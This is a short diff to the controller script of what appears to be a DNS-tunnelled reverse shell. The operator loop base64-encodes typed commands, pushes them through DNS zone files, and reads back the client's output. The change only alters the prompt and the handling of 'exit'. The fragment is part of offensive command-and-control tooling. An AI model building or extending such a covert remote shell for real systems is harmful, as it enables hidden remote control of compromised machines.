@@ -98,7 +98,7 @@ preset = f"../bind/data/zones/revshell.{domain}.preset"
 command = ""
 counter = 0
 while(command != "exit"):
-    print("Enter command:")
+    print("PS>")
     command = base64_encode_string(input())
 
     # send command to client
@@ -112,7 +112,8 @@ while(command != "exit"):
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.STDOUT)
 
-    # Wait for response
-    getData(code, counter)
+    if(command != "exit"):
+        # Get response from client
+        getData(code, counter)
 
     counter += 1
